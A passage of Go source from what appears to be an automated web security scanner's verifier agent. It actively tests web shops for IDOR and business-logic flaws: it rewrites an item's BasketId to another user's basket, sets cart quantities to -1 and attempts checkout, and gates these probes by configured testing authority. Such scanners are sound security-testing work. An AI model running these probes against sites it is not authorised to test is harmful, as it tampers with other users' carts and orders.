		if method != "POST" && method != "PUT" && method != "PATCH" {
			continue
		}
		ct := headerValue(entry.Request.Headers, "content-type")
		if !strings.Contains(strings.ToLower(ct), "json") && !json.Valid(entry.Request.Body) {
			continue
		}
		var body map[string]any
		if err := json.Unmarshal(entry.Request.Body, &body); err != nil || len(body) == 0 {
			continue
		}
		fields := mutableOwnershipFields(body)
		if len(fields) == 0 {
			continue
		}
		if !idorTargetLooksOwnedObject(entry.Request.URL, fields...) && !idorTargetLooksOwnedObject(entry.Request.Path, fields...) {
			continue
		}
		rawURL := entry.Request.URL
		if originFromURL(rawURL) == "" {
			path := entry.Request.Path
			if !strings.HasPrefix(path, "/") {
				path = "/" + path
			}
			rawURL = origin + path
		}
		key := method + " " + rawURL
		if seen[key] {
			continue
		}
		seen[key] = true
		out = append(out, mutableOwnershipCandidate{
			URL:         rawURL,
			Path:        entry.Request.Path,
			Method:      method,
			Body:        body,
			OwnerFields: fields,
			PreferAuth:  requestHasCredentialMaterial(entry.Request.Headers) || mutableOwnershipLikelyAuthenticatedPath(entry.Request.Path),
			Source:      "observed JSON object write containing owner/foreign-key fields",
		})
		if len(out) >= 8 {
			return out
		}
	}
	return out
}

func mutableOwnershipFields(body map[string]any) []string {
	preferred := []string{
		"UserId", "userId", "user_id", "ownerId", "owner_id",
		"accountId", "account_id", "customerId", "customer_id",
		"tenantId", "tenant_id", "organizationId", "organization_id",
		"orgId", "org_id", "memberId", "member_id",
		"BasketId", "basketId", "basket_id", "CartId", "cartId", "cart_id",
	}
	seen := make(map[string]bool)
	var out []string
	for _, want := range preferred {
		for key := range body {
			if seen[key] || !strings.EqualFold(key, want) {
				continue
			}
			seen[key] = true
			out = append(out, key)
			if len(out) >= 3 {
				return out
			}
		}
	}
	for key := range body {
		if seen[key] {
			continue
		}
		if agentAccessFieldLooksOwnershipRelevant(key) || mutableOwnershipFieldLooksContainerKey(key) {
			seen[key] = true
			out = append(out, key)
			if len(out) >= 3 {
				return out
			}
		}
	}
	return out
}

func mutableOwnershipFieldLooksContainerKey(field string) bool {
	compact := strings.ToLower(strings.ReplaceAll(strings.ReplaceAll(strings.TrimSpace(field), "_", ""), "-", ""))
	return compact == "basketid" || compact == "cartid" || compact == "containerid" || compact == "collectionid"
}

func mutableOwnershipLikelyAuthenticatedPath(path string) bool {
	lower := strings.ToLower(path)
	for _, term := range []string{
		"user", "account", "profile", "address", "payment", "wallet",
		"order", "basket", "cart", "review", "feedback", "message",
		"invoice", "booking", "tenant", "team", "organization",
	} {
		if strings.Contains(lower, term) {
			return true
		}
	}
	return false
}

func mutableOwnershipMutatedValue(value any) (any, bool) {
	if n, ok := integerLikeValue(value); ok {
		if n < 0 {
			n = 0
		}
		return n + 1, true
	}
	if s, ok := value.(string); ok {
		s = strings.TrimSpace(s)
		if n, ok := parseSmallInt64(s); ok {
			return fmt.Sprintf("%d", n+1), true
		}
		if looksUUIDLikeSegment(s) {
			return "00000000-0000-4000-8000-000000000001", true
		}
	}
	return nil, false
}

func integerLikeValue(value any) (int64, bool) {
	switch typed := value.(type) {
	case int:
		return int64(typed), true
	case int64:
		return typed, true
	case int32:
		return int64(typed), true
	case float64:
		if typed == float64(int64(typed)) {
			return int64(typed), true
		}
	case json.Number:
		if n, err := typed.Int64(); err == nil {
			return n, true
		}
	}
	return 0, false
}

func parseSmallInt64(s string) (int64, bool) {
	if s == "" || len(s) > 18 {
		return 0, false
	}
	var n int64
	for _, r := range s {
		if r < '0' || r > '9' {
			return 0, false
		}
		n = n*10 + int64(r-'0')
	}
	return n, true
}

func mapValueCaseInsensitive(body map[string]any, want string) (any, bool) {
	for key, value := range body {
		if strings.EqualFold(key, want) {
			return value, true
		}
	}
	return nil, false
}

func (v *VerifierAgent) sendMutableOwnershipJSON(ctx context.Context, candidate mutableOwnershipCandidate, body map[string]any) (mutableOwnershipResult, bool) {
	bodyBytes, err := json.Marshal(body)
	if err != nil {
		return mutableOwnershipResult{}, false
	}
	method := candidate.Method
	if method == "" {
		method = "POST"
	}
	authHeaders, authSource := v.credentialHeadersForURL(candidate.URL)
	type authAttempt struct {
		headers map[string]string
		source  string
	}
	attempts := []authAttempt{{}}
	if len(authHeaders) > 0 {
		withAuth := authAttempt{headers: authHeaders, source: authSource}
		if candidate.PreferAuth {
			attempts = []authAttempt{withAuth, {}}
		} else {
			attempts = append(attempts, withAuth)
		}
	}
	for _, attempt := range attempts {
		status, respBody, ok := v.sendJSONWithHeaders(ctx, method, candidate.URL, bodyBytes, attempt.headers, "AOBTD/Verifier (mutable ownership-field probe)")
		if !ok {
			continue
		}
		if (status == 401 || status == 403) && len(attempt.headers) == 0 && len(authHeaders) > 0 {
			continue
		}
		return mutableOwnershipResult{Status: status, Body: respBody, AuthSource: attempt.source}, true
	}
	return mutableOwnershipResult{}, false
}

func (v *VerifierAgent) sendJSONWithHeaders(ctx context.Context, method, rawURL string, body []byte, headers map[string]string, userAgent string) (int, string, bool) {
	req, err := http.NewRequestWithContext(ctx, method, rawURL, strings.NewReader(string(body)))
	if err != nil {
		return 0, "", false
	}
	req.Header.Set("Content-Type", "application/json")
	if userAgent == "" {
		userAgent = "AOBTD/Verifier"
	}
	req.Header.Set("User-Agent", userAgent)
	for k, val := range headers {
		lower := strings.ToLower(k)
		if lower == "host" || lower == "content-length" || lower == "content-type" {
			continue
		}
		req.Header.Set(k, val)
	}
	resp, err := v.client.Do(req)
	if err != nil || resp == nil {
		return 0, "", false
	}
	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 1024*1024))
	resp.Body.Close()
	return resp.StatusCode, string(respBody), true
}

func activeWriteAuthHeaders(headers map[string]string) map[string]string {
	out := make(map[string]string)
	for k, v := range headers {
		if strings.TrimSpace(v) == "" {
			continue
		}
		lower := strings.ToLower(k)
		switch {
		case lower == "authorization":
			out[k] = v
		case lower == "cookie":
			out[k] = v
		case lower == "x-csrf-token" || lower == "x-xsrf-token" || lower == "x-requested-with":
			out[k] = v
		case strings.Contains(lower, "csrf") || strings.Contains(lower, "xsrf"):
			out[k] = v
		}
	}
	if len(out) == 0 {
		return nil
	}
	return out
}

func mutableOwnershipAcceptanceSignal(field string, expected any, body string) string {
	var decoded any
	if err := json.Unmarshal([]byte(body), &decoded); err != nil {
		return ""
	}
	if signal, ok := jsonFieldValueSignal(decoded, field, expected); ok {
		return signal
	}
	return ""
}

func jsonFieldValueSignal(value any, field string, expected any) (string, bool) {
	switch typed := value.(type) {
	case map[string]any:
		for key, item := range typed {
			if strings.EqualFold(key, field) && jsonValuesEquivalent(item, expected) {
				return fmt.Sprintf("%s=%s", key, summarizeJSONValue(item)), true
			}
		}
		for _, item := range typed {
			if signal, ok := jsonFieldValueSignal(item, field, expected); ok {
				return signal, true
			}
		}
	case []any:
		for _, item := range typed {
			if signal, ok := jsonFieldValueSignal(item, field, expected); ok {
				return signal, true
			}
		}
	}
	return "", false
}

func jsonValuesEquivalent(a any, b any) bool {
	if an, ok := integerLikeValue(a); ok {
		if bn, ok := integerLikeValue(b); ok {
			return an == bn
		}
		if bs, ok := b.(string); ok {
			if parsed, ok := parseSmallInt64(strings.TrimSpace(bs)); ok {
				return an == parsed
			}
		}
	}
	if as, ok := a.(string); ok {
		if bs, ok := b.(string); ok {
			return strings.TrimSpace(as) == strings.TrimSpace(bs)
		}
		if bn, ok := integerLikeValue(b); ok {
			if parsed, ok := parseSmallInt64(strings.TrimSpace(as)); ok {
				return parsed == bn
			}
		}
	}
	return fmt.Sprint(a) == fmt.Sprint(b)
}

func mutableOwnershipBasketSurfaceObserved(entries []types.TrafficEntry) bool {
	for _, entry := range entries {
		text := strings.ToLower(entry.Request.Path + " " + entry.Request.URL)
		if strings.Contains(text, "basket") || strings.Contains(text, "cart") {
			return true
		}
		if trafficEntryLooksJavaScript(entry) {
			body := strings.ToLower(string(entry.Response.Body))
			if strings.Contains(body, "basketitems") || strings.Contains(body, "/basket") || strings.Contains(body, "/cart") {
				return true
			}
		}
	}
	return false
}

func (v *VerifierAgent) probeCartItemForeignKeyMutation(ctx context.Context, target string, entries []types.TrafficEntry) {
	origin := originFromURL(target)
	if origin == "" {
		return
	}
	origin = strings.TrimRight(origin, "/")
	createURL := origin + "/api/BasketItems"
	authHeaders, authSource := v.credentialHeadersForURL(createURL)
	if len(authHeaders) == 0 {
		return
	}
	basketID, ok := mutableOwnershipBasketIDFromHeaders(authHeaders)
	if !ok || basketID <= 0 {
		return
	}
	authHeaders = activeWriteAuthHeaders(authHeaders)
	if len(authHeaders) == 0 {
		return
	}
	productIDs := mutableOwnershipProductIDsFromTraffic(entries, 8)
	if len(productIDs) == 0 {
		productIDs = []int64{1}
	}

	v.db.InsertNarration(v.scanID, "verifier", "attempt",
		"Testing whether an authenticated cart item accepts client-controlled basket/cart foreign keys.",
		createURL, map[string]any{
			"source":      "observed basket/cart surface",
			"auth_source": authSource,
		})

	var createdID int64
	var createStatus int
	var createBody string
	var setupFailures []string
	authAttempts := projectionAuthAttempts(authHeaders, authSource)
	for _, productID := range productIDs {
		body := map[string]any{
			"ProductId": productID,
			"BasketId":  basketID,
			"quantity":  1,
		}
		bodyBytes, _ := json.Marshal(body)
		for _, attempt := range authAttempts {
			if ctx.Err() != nil {
				return
			}
			status, respBody, ok := v.sendJSONWithHeaders(ctx, "POST", createURL, bodyBytes, attempt.Headers, "AOBTD/Verifier (cart ownership setup)")
			if !ok {
				continue
			}
			createStatus = status
			createBody = respBody
			if status < 200 || status >= 300 {
				if len(setupFailures) < 8 {
					setupFailures = append(setupFailures, fmt.Sprintf("product=%d status=%d", productID, status))
				}
				continue
			}
			createdID, ok = jsonNestedInt64(respBody, "id")
			if ok && createdID > 0 {
				authHeaders = attempt.Headers
				if attempt.Source != "" {
					authSource = attempt.Source
				}
				break
			}
			if len(setupFailures) < 8 {
				setupFailures = append(setupFailures, fmt.Sprintf("product=%d status=%d no item id", productID, status))
			}
		}
		if createdID > 0 {
			break
		}
	}
	if createdID <= 0 {
		v.dismissed++
		v.db.InsertNarration(v.scanID, "verifier", "dismissed",
			fmt.Sprintf("Cart item setup for ownership mutation did not create an item (last status %d).", createStatus),
			createURL, map[string]any{
				"response_body": truncateString(createBody, 280),
				"product_ids":   productIDs,
				"failures":      setupFailures,
			})
		return
	}

	mutatedBasketID := basketID + 1
	mutateURL := fmt.Sprintf("%s/api/BasketItems/%d", origin, createdID)
	mutateBody := map[string]any{
		"BasketId": mutatedBasketID,
		"quantity": 1,
	}
	mutateBytes, _ := json.Marshal(mutateBody)
	status, respBody, ok := v.sendJSONWithHeaders(ctx, "PUT", mutateURL, mutateBytes, authHeaders, "AOBTD/Verifier (cart ownership mutation)")
	v.tested++
	if !ok {
		v.dismissed++
		return
	}
	result := mutableOwnershipResult{Status: status, Body: respBody, AuthSource: authSource}
	if status >= 200 && status < 300 {
		signal := mutableOwnershipAcceptanceSignal("BasketId", mutatedBasketID, respBody)
		if signal != "" {
			v.confirmed++
			candidate := mutableOwnershipCandidate{
				URL:         mutateURL,
				Path:        fmt.Sprintf("/api/BasketItems/%d", createdID),
				Method:      "PUT",
				Body:        mutateBody,
				OwnerFields: []string{"BasketId"},
				PreferAuth:  true,
				Source:      "observed cart/basket item endpoint with authenticated item setup",
			}
			v.storeMutableOwnershipFinding(candidate, "BasketId", mutatedBasketID, mutateBody, result, signal)
			v.db.InsertNarration(v.scanID, "verifier", "confirmed",
				fmt.Sprintf("Cart item %d accepted a mutated BasketId (%s).", createdID, signal),
				mutateURL, map[string]any{
					"setup_status": createStatus,
					"setup_body":   truncateString(createBody, 240),
				})
			return
		}
	}
	v.dismissed++
	v.db.InsertNarration(v.scanID, "verifier", "dismissed",
		fmt.Sprintf("Cart item foreign-key mutation was attempted but not accepted (status %d).", status),
		mutateURL, map[string]any{
			"field":         "BasketId",
			"original":      basketID,
			"mutated":       mutatedBasketID,
			"response_body": truncateString(respBody, 280),
		})
}

type cartNumericCreateResult struct {
	CreateURL  string
	CreatePath string
	ProductID  int64
	BasketID   int64
	ItemID     int64
	Body       map[string]any
	Status     int
	RespBody   string
	AuthSource string
}

type cartNumericMutationResult struct {
	URL        string
	Path       string
	Method     string
	Field      string
	Value      any
	Body       map[string]any
	Status     int
	RespBody   string
	Signal     string
	StoredURL  string
	StoredBody string
}

type cartNumericCheckoutResult struct {
	URL      string
	Path     string
	Body     map[string]any
	Status   int
	RespBody string
	Signal   string
}

// probeCartOrderNumericInvariants verifies a common business-logic invariant:
// quantities and money-like fields in a cart/order flow should never accept
// negative or impossible values. The probe intentionally builds a small,
// disposable, low-privileged flow instead of mutating a real user's cart.
// Active authority may create and mutate that disposable cart item; full_control
// additionally permits checkout/order completion because that creates stronger
// downstream target state.
func (v *VerifierAgent) probeCartOrderNumericInvariants(ctx context.Context, target string) {
	entries, err := v.db.GetTrafficByScan(v.scanID)
	if err != nil {
		return
	}
	if !cartOrderNumericSurfaceObserved(entries) {
		return
	}
	mutationAllowed, checkoutAllowed := cartOrderNumericInvariantAuthority(v.authority)
	if !mutationAllowed {
		v.db.InsertNarration(v.scanID, "verifier", "dismissed",
			fmt.Sprintf("Observed cart/order numeric surfaces, but skipped order-impact probe because testing authority is %q.",
				firstNonBlank(string(v.authority), string(policy.AuthorityActive))),
			target, map[string]any{"required_authority": policy.AuthorityActive})
		return
	}

	persona, ok := v.ensureSyntheticLowPrivilegePersona(ctx, target, entries)
	if !ok || len(persona.Headers) == 0 {
		v.db.InsertNarration(v.scanID, "verifier", "dismissed",
			"Could not create/login a disposable low-privileged user for cart/order numeric invariant testing.",
			target, nil)
		return
	}
	headers := activeWriteAuthHeaders(persona.Headers)
	if len(headers) == 0 {
		headers = cloneHeaderMap(persona.Headers)
	}
	basketID, ok := mutableOwnershipBasketIDFromHeaders(headers)
	if !ok || basketID <= 0 {
		basketID, _ = v.cartOrderContainerIDFromWhoami(ctx, target, headers)
	}
	if basketID <= 0 {
		v.dismissed++
		v.db.InsertNarration(v.scanID, "verifier", "dismissed",
			"Disposable user login succeeded, but no cart/basket/container id could be derived for numeric invariant testing.",
			target, map[string]any{"persona": persona.Email})
		return
	}

	origin := strings.TrimRight(originFromURL(target), "/")
	if origin == "" {
		origin = strings.TrimRight(target, "/")
	}
	productIDs := v.cartOrderProductIDs(ctx, origin, entries, headers, 8)
	if len(productIDs) == 0 {
		v.dismissed++
		v.db.InsertNarration(v.scanID, "verifier", "dismissed",
			"Cart/order numeric invariant probe saw a basket/cart id, but could not infer any product/item id to add.",
			target, map[string]any{"basket_id": basketID})
		return
	}

	v.db.InsertNarration(v.scanID, "verifier", "attempt",
		fmt.Sprintf("Testing cart/order numeric invariants with disposable user %s across %d product candidate(s).",
			persona.Email, len(productIDs)),
		target, map[string]any{
			"basket_id":   basketID,
			"auth_source": persona.Source,
		})

	create, ok := v.createCartOrderProbeItem(ctx, origin, basketID, productIDs, headers, persona.Source)
	if !ok {
		return
	}
	mutation, ok := v.mutateCartOrderProbeItemNegative(ctx, origin, create, headers)
	if !ok {
		return
	}
	var checkout cartNumericCheckoutResult
	checkoutOK := false
	if checkoutAllowed {
		checkout, checkoutOK = v.checkoutCartOrderProbe(ctx, origin, basketID, headers)
	} else {
		v.db.InsertNarration(v.scanID, "verifier", "skipped",
			"Cart/order item mutation proof succeeded; checkout impact proof was skipped because it requires Full Control authority.",
			mutation.URL, map[string]any{
				"required_authority": policy.AuthorityFullControl,
				"current_authority":  firstNonBlank(string(v.authority), string(policy.AuthorityActive)),
				"item_id":            create.ItemID,
				"basket_id":          basketID,
			})
	}

	v.confirmed++
	v.storeCartOrderNumericInvariantFinding(persona, create, mutation, checkout, checkoutOK)
	if checkoutOK {
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("Cart/order chain accepted %s=%s and checkout completed (%s).",
				mutation.Field, summarizeJSONValue(mutation.Value), checkout.Signal),
			checkout.URL, map[string]any{
				"item_id":     create.ItemID,
				"product_id":  create.ProductID,
				"basket_id":   basketID,
				"mutation":    mutation.URL,
				"checkout":    checkout.URL,
				"auth_source": create.AuthSource,
			})
		return
	}
	v.db.InsertNarration(v.scanID, "verifier", "confirmed",
		fmt.Sprintf("Cart/order item accepted impossible numeric value %s=%s (%s); checkout impact was not confirmed.",
			mutation.Field, summarizeJSONValue(mutation.Value), mutation.Signal),
		mutation.URL, map[string]any{
			"item_id":     create.ItemID,
			"product_id":  create.ProductID,
			"basket_id":   basketID,
			"auth_source": create.AuthSource,
		})
}

func cartOrderNumericInvariantAuthority(authority policy.TestingAuthority) (mutationAllowed bool, checkoutAllowed bool) {
	switch authority {
	case policy.AuthorityActive:
		return true, false
	case policy.AuthorityFullControl:
		return true, true
	default:
		return false, false
	}
}

func cartOrderNumericSurfaceObserved(entries []types.TrafficEntry) bool {
	hasContainer := false
	hasCatalog := false
	for _, entry := range entries {
		text := strings.ToLower(entry.Request.Path + " " + entry.Request.URL)
		body := ""
		if trafficEntryLooksJavaScript(entry) || strings.Contains(strings.ToLower(entry.Response.ContentType), "json") {
			body = strings.ToLower(string(entry.Response.Body))
		}
		combined := text + " " + body
		if strings.Contains(combined, "basket") || strings.Contains(combined, "cart") || strings.Contains(combined, "checkout") || strings.Contains(combined, "order") {
			hasContainer = true
		}
		if strings.Contains(combined, "product") || strings.Contains(combined, "catalog") || strings.Contains(combined, "quantity") || strings.Contains(combined, "sku") || strings.Contains(combined, "item") {
			hasCatalog = true
		}
		if hasContainer && hasCatalog {
			return true
		}
	}
	return false
}

func (v *VerifierAgent) cartOrderContainerIDFromWhoami(ctx context.Context, target string, headers map[string]string) (int64, bool) {
	origin := strings.TrimRight(originFromURL(target), "/")
	if origin == "" {
		origin = strings.TrimRight(target, "/")
	}
	for _, path := range []string{"/rest/user/whoami", "/api/me", "/api/user/me", "/api/profile", "/api/session"} {
		if ctx.Err() != nil {
			return 0, false
		}
		resp, body, _, err := v.proactiveGETWithHeaders(ctx, origin+path, headers,
			"AOBTD/Verifier (cart numeric invariant whoami)")
		v.tested++
		if err != nil || resp == nil || resp.StatusCode < 200 || resp.StatusCode >= 300 {
			if err == nil {
				v.dismissed++
			}
			continue
		}
		for _, key := range []string{"bid", "basketId", "BasketId", "cartId", "CartId", "containerId"} {
			if id, ok := jsonNestedInt64(body, key); ok && id > 0 {
				return id, true
			}
		}
	}
	return 0, false
}

func (v *VerifierAgent) cartOrderProductIDs(ctx context.Context, origin string, entries []types.TrafficEntry, headers map[string]string, limit int) []int64 {
	if limit <= 0 {
		limit = 8
	}
	seen := make(map[int64]bool)
	var out []int64
	add := func(id int64) bool {
		if id <= 0 || seen[id] {
			return false
		}
		seen[id] = true
		out = append(out, id)
		return len(out) >= limit
	}
	for _, id := range mutableOwnershipProductIDsFromTraffic(entries, limit) {
		if add(id) {
			return out
		}
	}
	for _, path := range []string{
		"/api/Quantitys/",
		"/api/Products",
		"/api/products",
		"/rest/products/search?q=",
		"/api/catalog",
		"/api/items",
	} {
		if ctx.Err() != nil {
			return out
		}
		resp, body, _, err := v.proactiveGETWithHeaders(ctx, origin+path, headers,
			"AOBTD/Verifier (cart numeric product discovery)")
		v.tested++
		if err != nil || resp == nil || resp.StatusCode < 200 || resp.StatusCode >= 300 {
			if err == nil {
				v.dismissed++
			}
			continue
		}
		for _, id := range jsonPositiveIntsForKeys(body, "ProductId", "productId", "product_id", "itemId", "item_id", "id") {
			if add(id) {
				return out
			}
		}
	}
	return out
}

func (v *VerifierAgent) createCartOrderProbeItem(ctx context.Context, origin string, basketID int64, productIDs []int64, headers map[string]string, authSource string) (cartNumericCreateResult, bool) {
	authAttempts := projectionAuthAttempts(headers, authSource)
	if len(authAttempts) == 0 {
		authAttempts = []projectionAuthAttempt{{Headers: headers, Source: authSource}}
	}
	var failures []string
	for _, productID := range productIDs {
		for _, candidate := range cartOrderCreateItemCandidates(origin, basketID, productID) {
			if ctx.Err() != nil {
				return cartNumericCreateResult{}, false
			}
			bodyBytes, _ := json.Marshal(candidate.Body)
			for _, attempt := range authAttempts {
				status, respBody, ok := v.sendJSONWithHeaders(ctx, http.MethodPost, candidate.URL, bodyBytes, attempt.Headers,
					"AOBTD/Verifier (cart numeric invariant item create)")
				v.tested++
				if !ok {
					continue
				}
				if status < 200 || status >= 300 {
					v.dismissed++
					if len(failures) < 8 {
						failures = append(failures, fmt.Sprintf("%s product=%d status=%d", candidate.Path, productID, status))
					}
					continue
				}
				itemID, itemOK := jsonNestedInt64(respBody, "id")
				if !itemOK || itemID <= 0 {
					itemID, itemOK = jsonNestedInt64(respBody, "itemId")
				}
				if !itemOK || itemID <= 0 {
					v.dismissed++
					if len(failures) < 8 {
						failures = append(failures, fmt.Sprintf("%s product=%d status=%d no item id", candidate.Path, productID, status))
					}
					continue
				}
				source := attempt.Source
				if source == "" {
					source = authSource
				}
				return cartNumericCreateResult{
					CreateURL:  candidate.URL,
					CreatePath: candidate.Path,
					ProductID:  productID,
					BasketID:   basketID,
					ItemID:     itemID,
					Body:       candidate.Body,
					Status:     status,
					RespBody:   respBody,
					AuthSource: source,
				}, true
			}
		}
	}
	v.dismissed++
	v.db.InsertNarration(v.scanID, "verifier", "dismissed",
		"Cart/order numeric invariant probe could not create a disposable cart item.",
		origin, map[string]any{
			"basket_id":   basketID,
			"product_ids": productIDs,
			"failures":    failures,
		})
	return cartNumericCreateResult{}, false
}

type cartOrderCreateItemCandidate struct {
	URL  string
	Path string
	Body map[string]any
}

func cartOrderCreateItemCandidates(origin string, basketID, productID int64) []cartOrderCreateItemCandidate {
	origin = strings.TrimRight(origin, "/")
	paths := []string{
		"/api/BasketItems",
		"/api/BasketItems/",
		"/api/basket-items",
		"/api/cart/items",
		fmt.Sprintf("/api/carts/%d/items", basketID),
		fmt.Sprintf("/api/baskets/%d/items", basketID),
		fmt.Sprintf("/rest/basket/%d/items", basketID),
		"/rest/cart/items",
	}
	bodies := []map[string]any{
		{"ProductId": productID, "BasketId": basketID, "quantity": 1},
		{"productId": productID, "basketId": basketID, "quantity": 1},
		{"product_id": productID, "basket_id": basketID, "quantity": 1},
		{"productId": productID, "cartId": basketID, "quantity": 1},
		{"itemId": productID, "cartId": basketID, "qty": 1},
		{"skuId": productID, "cartId": basketID, "quantity": 1},
	}
	seen := make(map[string]bool)
	var out []cartOrderCreateItemCandidate
	for _, path := range paths {
		for _, body := range bodies {
			keyBytes, _ := json.Marshal(body)
			key := path + "|" + string(keyBytes)
			if seen[key] {
				continue
			}
			seen[key] = true
			out = append(out, cartOrderCreateItemCandidate{
				URL:  origin + path,
				Path: path,
				Body: cloneJSONMap(body),
			})
		}
	}
	return out
}

func (v *VerifierAgent) mutateCartOrderProbeItemNegative(ctx context.Context, origin string, create cartNumericCreateResult, headers map[string]string) (cartNumericMutationResult, bool) {
	authAttempts := projectionAuthAttempts(headers, create.AuthSource)
	if len(authAttempts) == 0 {
		authAttempts = []projectionAuthAttempt{{Headers: headers, Source: create.AuthSource}}
	}
	var failures []string
	for _, candidate := range cartOrderNegativeMutationCandidates(origin, create) {
		if ctx.Err() != nil {
			return cartNumericMutationResult{}, false
		}
		bodyBytes, _ := json.Marshal(candidate.Body)
		for _, attempt := range authAttempts {
			status, respBody, ok := v.sendJSONWithHeaders(ctx, candidate.Method, candidate.URL, bodyBytes, attempt.Headers,
				"AOBTD/Verifier (cart numeric invariant negative mutation)")
			v.tested++
			if !ok {
				continue
			}
			if status < 200 || status >= 300 {
				v.dismissed++
				if len(failures) < 10 {
					failures = append(failures, fmt.Sprintf("%s %s status=%d", candidate.Method, candidate.Path, status))
				}
				continue
			}
			field, value := cartOrderNegativeField(candidate.Body)
			signal := mutableOwnershipAcceptanceSignal(field, value, respBody)
			if signal == "" {
				v.dismissed++
				if len(failures) < 10 {
					failures = append(failures, fmt.Sprintf("%s %s status=%d no echo", candidate.Method, candidate.Path, status))
				}
				continue
			}
			result := cartNumericMutationResult{
				URL:      candidate.URL,
				Path:     candidate.Path,
				Method:   candidate.Method,
				Field:    field,
				Value:    value,
				Body:     candidate.Body,
				Status:   status,
				RespBody: respBody,
				Signal:   signal,
			}
			if storedURL, storedBody, storedSignal := v.verifyCartOrderNegativeStored(ctx, origin, create.BasketID, headers, field, value); storedSignal != "" {
				result.StoredURL = storedURL
				result.StoredBody = storedBody
				result.Signal += "; stored " + storedSignal
			}
			return result, true
		}
	}
	v.dismissed++
	v.db.InsertNarration(v.scanID, "verifier", "dismissed",
		"Cart/order numeric invariant probe created an item, but impossible quantity/amount mutation was not accepted.",
		create.CreateURL, map[string]any{
			"item_id":  create.ItemID,
			"failures": failures,
		})
	return cartNumericMutationResult{}, false
}

type cartOrderMutationCandidate struct {
	URL    string
	Path   string
	Method string
	Body   map[string]any
}

func cartOrderNegativeMutationCandidates(origin string, create cartNumericCreateResult) []cartOrderMutationCandidate {
	origin = strings.TrimRight(origin, "/")
	basePath := strings.TrimRight(create.CreatePath, "/")
	if basePath == "" {
		basePath = "/api/cart/items"
	}
	paths := []string{
		fmt.Sprintf("%s/%d", basePath, create.ItemID),
		fmt.Sprintf("/api/BasketItems/%d", create.ItemID),
		fmt.Sprintf("/api/cart/items/%d", create.ItemID),
		fmt.Sprintf("/api/carts/%d/items/%d", create.BasketID, create.ItemID),
		fmt.Sprintf("/api/baskets/%d/items/%d", create.BasketID, create.ItemID),
	}
	bodies := []map[string]any{
		{"quantity": -1},
		{"qty": -1},
		{"count": -1},
		{"amount": -1},
		{"ProductId": create.ProductID, "BasketId": create.BasketID, "quantity": -1},
		{"productId": create.ProductID, "basketId": create.BasketID, "quantity": -1},
		{"product_id": create.ProductID, "basket_id": create.BasketID, "quantity": -1},
		{"productId": create.ProductID, "cartId": create.BasketID, "quantity": -1},
	}
	methods := []string{http.MethodPut, http.MethodPatch}
	seen := make(map[string]bool)
	var out []cartOrderMutationCandidate
	for _, method := range methods {
		for _, path := range paths {
			for _, body := range bodies {
				keyBytes, _ := json.Marshal(body)
				key := method + " " + path + "|" + string(keyBytes)
				if seen[key] {
					continue
				}
				seen[key] = true
				out = append(out, cartOrderMutationCandidate{
					URL:    origin + path,
					Path:   path,
					Method: method,
					Body:   cloneJSONMap(body),
				})
			}
		}
	}
	return out
}

func cartOrderNegativeField(body map[string]any) (string, any) {
	for _, key := range []string{"quantity", "qty", "count", "amount", "total", "price"} {
		if value, ok := mapValueCaseInsensitive(body, key); ok {
			return key, value
		}
	}
	for key, value := range body {
		if n, ok := integerLikeValue(value); ok && n < 0 {
			return key, value
		}
	}
	return "quantity", -1
}

func (v *VerifierAgent) verifyCartOrderNegativeStored(ctx context.Context, origin string, basketID int64, headers map[string]string, field string, value any) (string, string, string) {
	for _, path := range []string{
		fmt.Sprintf("/rest/basket/%d", basketID),
		fmt.Sprintf("/api/baskets/%d", basketID),
		fmt.Sprintf("/api/carts/%d", basketID),
		fmt.Sprintf("/api/cart/%d", basketID),
	} {
		if ctx.Err() != nil {
			return "", "", ""
		}
		rawURL := strings.TrimRight(origin, "/") + path
		resp, body, _, err := v.proactiveGETWithHeaders(ctx, rawURL, headers,
			"AOBTD/Verifier (cart numeric invariant readback)")
		v.tested++
		if err != nil || resp == nil || resp.StatusCode < 200 || resp.StatusCode >= 300 {
			if err == nil {
				v.dismissed++
			}
			continue
		}
		if signal := mutableOwnershipAcceptanceSignal(field, value, body); signal != "" {
			return rawURL, body, signal
		}
	}
	return "", "", ""
}

func (v *VerifierAgent) checkoutCartOrderProbe(ctx context.Context, origin string, basketID int64, headers map[string]string) (cartNumericCheckoutResult, bool) {
	authAttempts := projectionAuthAttempts(headers, "cart/order numeric invariant disposable user")
	if len(authAttempts) == 0 {
		authAttempts = []projectionAuthAttempt{{Headers: headers, Source: "cart/order numeric invariant disposable user"}}
	}
	for _, candidate := range cartOrderCheckoutCandidates(origin, basketID) {
		if ctx.Err() != nil {
			return cartNumericCheckoutResult{}, false
		}
		bodyBytes, _ := json.Marshal(candidate.Body)
		for _, attempt := range authAttempts {
			status, respBody, ok := v.sendJSONWithHeaders(ctx, http.MethodPost, candidate.URL, bodyBytes, attempt.Headers,
				"AOBTD/Verifier (cart numeric invariant checkout)")
			v.tested++
			if !ok {
				continue
			}
			if status < 200 || status >= 300 {
				v.dismissed++
				continue
			}
			signal := checkoutImpactSignal(respBody)
			if signal == "" {
				signal = fmt.Sprintf("checkout accepted with HTTP %d", status)
			}
			return cartNumericCheckoutResult{
				URL:      candidate.URL,
				Path:     candidate.Path,
				Body:     candidate.Body,
				Status:   status,
				RespBody: respBody,
				Signal:   signal,
			}, true
		}
	}
	return cartNumericCheckoutResult{}, false
}

type cartOrderCheckoutCandidate struct {
	URL  string
	Path string
	Body map[string]any
}

func cartOrderCheckoutCandidates(origin string, basketID int64) []cartOrderCheckoutCandidate {
	origin = strings.TrimRight(origin, "/")
	paths := []string{
		fmt.Sprintf("/rest/basket/%d/checkout", basketID),
		fmt.Sprintf("/api/baskets/%d/checkout", basketID),
		fmt.Sprintf("/api/carts/%d/checkout", basketID),
		fmt.Sprintf("/api/cart/%d/checkout", basketID),
		"/api/cart/checkout",
		"/api/checkout",
		"/checkout",
	}
	bodies := []map[string]any{
		{},
		{"basketId": basketID},
		{"cartId": basketID},
		{"containerId": basketID},
	}
	seen := make(map[string]bool)
	var out []cartOrderCheckoutCandidate
	for _, path := range paths {
		for _, body := range bodies {
			keyBytes, _ := json.Marshal(body)
			key := path + "|" + string(keyBytes)
			if seen[key] {
				continue
			}
			seen[key] = true
			out = append(out, cartOrderCheckoutCandidate{
				URL:  origin + path,
				Path: path,
				Body: cloneJSONMap(body),
			})
		}
	}
	return out
}

func checkoutImpactSignal(body string) string {
	var decoded any
	if err := json.Unmarshal([]byte(body), &decoded); err != nil {
		lower := strings.ToLower(body)
